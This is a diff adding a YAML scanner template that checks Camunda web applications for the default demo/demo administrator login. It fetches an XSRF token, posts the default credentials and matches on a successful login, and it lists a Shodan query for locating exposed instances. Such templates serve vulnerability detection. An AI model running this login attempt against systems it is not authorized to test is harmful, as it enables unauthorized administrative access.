@@ -1,0 +1,64 @@
+id: camunda-default-login
+
+info:
+  name: Camunda - Default Login
+  author: bhutch
+  severity: high
+  description: |
+    Camunda login panel contains a default login vulnerability.
+  reference:
+    - https://github.com/camunda/camunda-docs-manual/blob/master/content/webapps/admin/user-management.md
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: http.html:"Camunda Welcome"
+  tags: default-login,camunda
+
+http:
+  - raw:
+      - |
+        GET /camunda/app/welcome/default/ HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST /camunda/api/admin/auth/user/default/login/welcome HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+        Accept: application/json, text/plain, */*
+        X-Xsrf-Token: {{xsrf_token}}
+
+        username={{username}}&password={{password}}
+
+    attack: pitchfork
+    payloads:
+      username:
+        - demo
+      password:
+        - demo
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"userId"'
+          - '"authorizedApps"'
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: xsrf_token
+        group: 1
+        internal: true
+        part: header
+        regex:
+          - '(?i)Set-Cookie: XSRF-TOKEN=([A-Za-z0-9_.-]+)'
+# digest: 4a0a00473045022100e44b1f147070af3c4b4939e5223d082a9f844c9a8d4265478dd314bf3d9255a102200cc88788bde9a05bfce0ffd9f8eb13e8beeb10cd2b543ac1114c4ccb4bb963c1:922c64590222798bb761d5b6d8e72950
